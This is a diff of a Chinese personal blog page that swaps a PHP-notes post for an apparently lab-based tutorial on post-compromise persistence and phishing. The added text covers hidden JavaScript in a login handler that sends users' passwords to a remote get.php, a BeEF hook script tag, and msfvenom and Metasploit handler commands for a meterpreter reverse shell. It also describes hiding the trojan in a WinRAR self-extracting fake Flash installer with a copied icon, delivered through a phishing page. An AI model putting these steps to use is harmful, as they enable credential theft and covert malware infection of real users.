@@ -16,23 +16,27 @@
   <meta name="author" content="Yf3te">
   <meta name="keywords" content="">
   
-    <meta name="description" content="知识点：1234561、php小知识2、数据库操作3、文件操作4、cookie&amp;session5、js前端&amp;Ajax6、框架  php小知识12345671、变量符 $ 在双引号中才会被解析2、GET传参($_GET[’a’])：有参数即可，不强制要求GET请求	POST传参($_POST[’a’])：必须是POST方式请求	3、php写html代码（php文件）echo &amp;quo">
+    <meta name="description" content="1、权限维持，获取登录记录 前提：拿到了web权限，例如：www-data：shell权限 然后确认其接收用户密码文件login_check.php，写入js动作(该代码不会被输出到页面，也比较隐蔽)，远程连接接收用户密码文件get.php  在get.php文件中包含文件写入代码  每当有人登录时，就会远程访问get.php，我们就可以从newfile.txt中得到用户密码 还可以直接远程连接b">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php开发">
-<meta property="og:url" content="http://example.com/2024/05/15/php%E5%BC%80%E5%8F%91/index.html">
+<meta property="og:title" content="模拟实战权限维持+钓鱼">
+<meta property="og:url" content="http://example.com/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/index.html">
 <meta property="og:site_name" content="Yf3te">
-<meta property="og:description" content="知识点：1234561、php小知识2、数据库操作3、文件操作4、cookie&amp;session5、js前端&amp;Ajax6、框架  php小知识12345671、变量符 $ 在双引号中才会被解析2、GET传参($_GET[’a’])：有参数即可，不强制要求GET请求	POST传参($_POST[’a’])：必须是POST方式请求	3、php写html代码（php文件）echo &amp;quo">
+<meta property="og:description" content="1、权限维持，获取登录记录 前提：拿到了web权限，例如：www-data：shell权限 然后确认其接收用户密码文件login_check.php，写入js动作(该代码不会被输出到页面，也比较隐蔽)，远程连接接收用户密码文件get.php  在get.php文件中包含文件写入代码  每当有人登录时，就会远程访问get.php，我们就可以从newfile.txt中得到用户密码 还可以直接远程连接b">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/9069e6da-04cb-4ae1-91f7-426cb1bbbf6e/Untitled.png">
-<meta property="article:published_time" content="2024-05-15T13:37:48.000Z">
-<meta property="article:modified_time" content="2024-05-15T13:38:33.106Z">
+<meta property="og:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/e2b6518a-fffe-49de-b404-d8f7eb8e1b09/Untitled.png">
+<meta property="og:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/70c06226-7ab9-498c-a607-cbffce4296b6/Untitled.png">
+<meta property="og:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/14a2b91a-995d-462c-8883-29a8082b6e5b/Untitled.png">
+<meta property="og:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/688b3531-f48f-4c03-b3ba-a84bdd7123a6/Untitled.png">
+<meta property="og:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/c1c4f9af-4140-4e71-a168-870955e1788c/Untitled.png">
+<meta property="article:published_time" content="2024-05-25T05:35:02.000Z">
+<meta property="article:modified_time" content="2024-05-25T05:35:42.126Z">
 <meta property="article:author" content="Yf3te">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/9069e6da-04cb-4ae1-91f7-426cb1bbbf6e/Untitled.png">
+<meta name="twitter:image" content="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/e2b6518a-fffe-49de-b404-d8f7eb8e1b09/Untitled.png">
   
   
   
-  <title>php开发 - Yf3te</title>
+  <title>模拟实战权限维持+钓鱼 - Yf3te</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -227,7 +231,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="php开发"></span>
+            <span id="subtitle" data-typed-text="模拟实战权限维持+钓鱼"></span>
           
         </div>
 
@@ -238,8 +242,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-05-15 21:37" pubdate>
-          2024年5月15日 晚上
+        <time datetime="2024-05-25 13:35" pubdate>
+          2024年5月25日 下午
         </time>
       </span>
     
@@ -250,7 +254,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          601 字
+          485 字
         
       </span>
     
@@ -261,7 +265,7 @@
         
         
         
-          6 分钟
+          5 分钟
         
       </span>
     
@@ -306,25 +310,33 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">php开发</h1>
+            <h1 id="seo-header">模拟实战权限维持+钓鱼</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、php小知识<br><span class="hljs-number">2</span>、数据库操作<br><span class="hljs-number">3</span>、文件操作<br><span class="hljs-number">4</span>、cookie&amp;session<br><span class="hljs-number">5</span>、js前端&amp;Ajax<br><span class="hljs-number">6</span>、框架<br></code></pre></td></tr></table></figure>
+                <p>1、权限维持，获取登录记录</p>
+<p>前提：拿到了web权限，例如：www-data：shell权限</p>
+<p>然后确认其接收用户密码文件login_check.php，写入js动作(该代码不会被输出到页面，也比较隐蔽)，远程连接接收用户密码文件get.php</p>
+<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/e2b6518a-fffe-49de-b404-d8f7eb8e1b09/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>在get.php文件中包含文件写入代码</p>
+<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/70c06226-7ab9-498c-a607-cbffce4296b6/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>每当有人登录时，就会远程访问get.php，我们就可以从newfile.txt中得到用户密码</p>
+<p>还可以直接远程连接beef，只需要修改js代码为</p>
+<script src=http://192.168.43.43:3000/hook.js></script>
 
-<h3 id="php小知识"><a href="#php小知识" class="headerlink" title="php小知识"></a>php小知识</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、变量符 $ 在双引号中才会被解析<br><br><span class="hljs-number">2</span>、GET传参(<span class="hljs-variable">$_GET</span>[’a’])：有参数即可，不强制要求GET请求<br>	POST传参(<span class="hljs-variable">$_POST</span>[’a’])：必须是POST方式请求<br>	<br><span class="hljs-number">3</span>、php写html代码（php文件）<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;tets&lt;/h1&gt;&quot;</span>  (php) = &lt;h1&gt;tets&lt;/h1&gt;(html)<br></code></pre></td></tr></table></figure>
+<h2 id="2、钓鱼实战"><a href="#2、钓鱼实战" class="headerlink" title="2、钓鱼实战"></a>2、钓鱼实战</h2><h3 id="1、msf生成木马文件"><a href="#1、msf生成木马文件" class="headerlink" title="1、msf生成木马文件"></a>1、msf生成木马文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">msfvenom <span class="hljs-operator">-</span>p windows<span class="hljs-operator">/</span>meterpreter<span class="hljs-operator">/</span>reverse_tcp LHOST<span class="hljs-operator">=</span><span class="hljs-number">192.168</span><span class="hljs-number">.43</span><span class="hljs-number">.43</span><br>LPORT<span class="hljs-operator">=</span><span class="hljs-number">6666</span> <span class="hljs-operator">-</span>f exe <span class="hljs-operator">&gt;</span> flash.exe<br><span class="hljs-number">2</span>、下载官方文件<span class="hljs-operator">-</span>保证安装正常<br><span class="hljs-number">3</span>、压缩捆绑文件<span class="hljs-operator">-</span>解压提取运行<br><span class="hljs-number">4</span>、MSF 配置监听状态<br>use exploit<span class="hljs-operator">/</span>multi<span class="hljs-operator">/</span>handler<br><span class="hljs-keyword">set</span> payload windows<span class="hljs-operator">/</span>meterpreter<span class="hljs-operator">/</span>reverse_tcp<br><span class="hljs-keyword">set</span> lhost <span class="hljs-number">192.168</span><span class="hljs-number">.43</span><span class="hljs-number">.43</span><br><span class="hljs-keyword">set</span> lport <span class="hljs-number">6666</span><br>run<br></code></pre></td></tr></table></figure>
 
-<h3 id="php数据库操作"><a href="#php数据库操作" class="headerlink" title="php数据库操作"></a>php数据库操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、连接数据库<br><br><span class="hljs-number">2</span>、数据库操作：增删改查<br></code></pre></td></tr></table></figure>
+<h3 id="2、木马文件封装思路"><a href="#2、木马文件封装思路" class="headerlink" title="2、木马文件封装思路"></a>2、木马文件封装思路</h3><p>为了掩人耳目，可以把木马文件和flash正经文件封装到压缩包里面，然后使用winrar工具进行自解压相关操作，找到选项解压前运行木马文件，这样当对方打开zip文件解压前，就会无声无息的运行我们的木马文件</p>
+<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/14a2b91a-995d-462c-8883-29a8082b6e5b/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/688b3531-f48f-4c03-b3ba-a84bdd7123a6/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>再把文件名改为flash_install.exe文件，同时为了更加逼真，我们还可以修改文件图标</p>
+<p>Restorator(图标修改工具)，修改过程就找到一个酷似flash官方的图标，然后工具替换就行了</p>
+<p>成品展示：</p>
+<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/c1c4f9af-4140-4e71-a168-870955e1788c/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h3 id="3、网站设计思路"><a href="#3、网站设计思路" class="headerlink" title="3、网站设计思路"></a>3、网站设计思路</h3><p>我们直接发送木马，对方肯定不会傻到直接点入，此时就要学会做钓鱼网站，勾起他的兴趣，比如放一个视频，但是当对方访问时显示flash版本不够，此时就重定向到自己编辑的网站，当按下安装键，就会让对方下载，然后运行</p>
+<p>然后利用虚拟机(NAT)完成实战即可，不知道桥接模式能否成功，没试过</p>
 
-<h3 id="php文件操作"><a href="#php文件操作" class="headerlink" title="php文件操作"></a>php文件操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、文件上传<br><span class="hljs-number">2</span>、文件下载<br><span class="hljs-number">3</span>、文件读取<br><span class="hljs-number">4</span>、文件包含<br><span class="hljs-number">5</span>、文件删除/修改<br>每个操作都有相关的函数，及其代码格式，网查即可<br></code></pre></td></tr></table></figure>
-
-<h3 id="cookie-session"><a href="#cookie-session" class="headerlink" title="cookie&amp;session"></a>cookie&amp;session</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">都是用于身份验证<br><br>cookie保存在浏览器，可修改伪造<br>cookie安全：修改(修改绕过验证)、伪造(尝试伪造绕过)、盗取(xss)<br>判断cookie，获取： <span class="hljs-variable">$_COOKIE</span><br><br>session保存在服务器，利用的特殊方式设置，难以伪造<br>session安全：劫持<br></code></pre></td></tr></table></figure>
-
-<h3 id="js前端-Ajax"><a href="#js前端-Ajax" class="headerlink" title="js前端&amp;Ajax"></a>js前端&amp;Ajax</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">如何判断网站由js处理、搭建：<br><span class="hljs-number">1</span>、查看返回数据包的是否含json的数据<br><span class="hljs-number">2</span>、查看回显时间，eg:挑选选中恶意文件但是并未点击上传时就已经被警告<br><span class="hljs-number">3</span>、禁止js后网站会不会无法运行<br><br>直接查看源代码、查看网站显示js文件(多点击网络的功能点，才可加载更多<br>的js文件)<br><br>可以拷贝到本地，搭建后，白盒审计<br><br>假如全是使用js进行编辑的网站，burp可劫持返回的js响应(下图)，再交给浏览器<br>处理，可以修改修改相关的参数值进行绕过相关验证<br><br><span class="hljs-title function_ invoke__">Ajax</span>(js的一种数据交互方式)<br>会在js搭建网站中用于传递数据、参数及其值<br><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/872af717-9657-424b-9fc7-5682f3608032/9069e6da-04cb-4ae1-91f7-426cb1bbbf6e/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
-<h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">判断框架：可以通过网站扫描、网站图标、网站框架报错(通过访问错误url等)<br><br><span class="hljs-number">1</span>、明确大概框架后，可以进一步搜索企业使用的框架版本<br><span class="hljs-number">2</span>、找源码，阅读相关的源码开发手册<br><span class="hljs-number">3</span>、源码确认框架版本<br><br>利用：<br><span class="hljs-number">1</span>、直接代码审计，挖框架漏洞(难)，如果成功就可以关联所有使用该框架的企业<br><span class="hljs-number">2</span>、历史框架漏洞<br><span class="hljs-number">3</span>、由于用户未使用框架的安全写法，而导致的漏洞<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -341,8 +353,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>php开发</div>
-      <div>http://example.com/2024/05/15/php开发/</div>
+      <div>模拟实战权限维持+钓鱼</div>
+      <div>http://example.com/2024/05/25/模拟实战权限维持-钓鱼/</div>
     </div>
     <div class="license-meta">
       
@@ -354,7 +366,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年5月15日</div>
+          <div>2024年5月25日</div>
         </div>
       
       
@@ -386,18 +398,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/05/25/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC/" title="模拟实战权限维持+钓鱼">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">模拟实战权限维持+钓鱼</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/05/15/Yf3te/" title="Yf3te">
-                        <span class="hidden-mobile">Yf3te</span>
+                      <a href="/2024/05/15/php%E5%BC%80%E5%8F%91/" title="php开发">
+                        <span class="hidden-mobile">php开发</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
